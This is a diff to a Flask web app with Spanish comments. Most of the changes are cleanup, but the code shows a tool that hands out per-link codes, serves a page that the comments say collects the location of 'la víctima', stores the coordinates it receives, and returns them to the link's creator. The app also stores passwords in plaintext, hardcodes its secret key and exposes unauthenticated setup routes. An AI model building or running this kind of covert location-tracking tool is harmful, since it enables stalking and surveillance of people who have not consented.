@@ -5,14 +5,15 @@ import random
 import string
 import os
 
+# Inicializa Flask
 app = Flask(__name__)
 app.secret_key = 'tu_clave_secreta'
 
-# Base de datos dinámica
+# Configuración de la base de datos
 db_url = os.environ.get("DATABASE_URL")
+
 if not db_url:
-    db_url = "sqlite:///fallback.db"
-    #raise ValueError("La variable DATABASE_URL no está definida")
+    raise ValueError("La variable DATABASE_URL no está definida")
 
 if db_url.startswith("postgres://"):
     db_url = db_url.replace("postgres://", "postgresql://", 1)
@@ -20,6 +21,7 @@ if db_url.startswith("postgres://"):
 app.config['SQLALCHEMY_DATABASE_URI'] = db_url
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
+# Inicializa SQLAlchemy
 db = SQLAlchemy(app)
 
 # Importa modelos después de inicializar db
@@ -34,24 +36,29 @@ login_manager.login_view = 'login'
 def load_user(user_id):
     return Usuario.query.get(int(user_id))
 
+# Ruta raíz → redirige al login
 @app.route('/')
 def home():
     return redirect(url_for('login'))
 
-# Ruta temporal para crear tablas si es necesario
+# Ruta temporal: Crea todas las tablas manualmente
 @app.route('/crear-tablas')
 def crear_tablas():
-    db.create_all()
-    return "Tablas creadas exitosamente"
+    try:
+        db.create_all()
+        return "Tablas creadas exitosamente"
+    except Exception as e:
+        app.logger.error(f"Error al crear tablas: {e}")
+        return f"Error al crear tablas: {str(e)}", 500
 
-# Ruta temporal para probar conexión a la DB
+# Ruta temporal: Verifica conexión a la base de datos
 @app.route('/test-db')
 def test_db():
     try:
         db.session.execute('SELECT 1')
         return "Conexión exitosa a la base de datos"
     except Exception as e:
-        return f"Error de conexión: {str(e)}"
+        return f"Error de conexión: {str(e)}", 500
 
 # Registro de nuevos usuarios
 @app.route('/register', methods=['GET', 'POST'])
@@ -64,15 +71,18 @@ def register():
             if not nombre or not password:
                 return "Faltan credenciales", 400
 
-            if Usuario.query.filter_by(nombre=nombre).first():
-                return "Nombre de usuario ya existe", 409  # Conflicto
+            usuario_existente = Usuario.query.filter_by(nombre=nombre).first()
+            if usuario_existente:
+                return "Nombre de usuario ya existe", 409
 
             nuevo_usuario = Usuario(nombre=nombre, password=password)
             db.session.add(nuevo_usuario)
             db.session.commit()
+
             return redirect(url_for('login'))
 
         except Exception as e:
+            db.session.rollback()
             app.logger.error(f"Error en /register: {e}")
             return f"Ocurrió un error interno: {str(e)}", 500
 
@@ -122,7 +132,7 @@ def registrar_dispositivo():
     db.session.commit()
     return jsonify({'codigo': codigo})
 
-# Página de ubicación para la víctima
+# Página que obtiene la ubicación de la víctima
 @app.route('/<string:codigo>')
 def mostrar_pagina(codigo):
     dispositivo = Dispositivo.query.filter_by(codigo=codigo).first()
@@ -139,6 +149,7 @@ def actualizar_ubicacion():
     precision = request.form.get('precision')
 
     dispositivo = Dispositivo.query.filter_by(codigo=codigo).first()
+
     if dispositivo and lat and lon:
         dispositivo.lat = float(lat)
         dispositivo.lon = float(lon)
@@ -148,12 +159,13 @@ def actualizar_ubicacion():
 
     return jsonify({'status': 'error'}), 400
 
-# API REST para el mapa
+# API REST para obtener ubicaciones del usuario actual
 @app.route('/api/ubicaciones')
 @login_required
 def api_ubicaciones():
     dispositivos = Dispositivo.query.filter_by(usuario_id=current_user.id).all()
     data = {}
+
     for d in dispositivos:
         if d.lat and d.lon:
             data[d.codigo] = {
@@ -162,9 +174,15 @@ def api_ubicaciones():
                 'precision': d.precision,
                 'alias': d.alias
             }
+
     return jsonify(data)
 
-# Iniciar servidor localmente (solo para desarrollo)
+# Evita errores por favicon.ico
+@app.route('/favicon.ico')
+def favicon():
+    return "", 200
+
+# Iniciar servidor localmente (solo desarrollo)
 if __name__ == '__main__':
     with app.app_context():
         db.create_all()
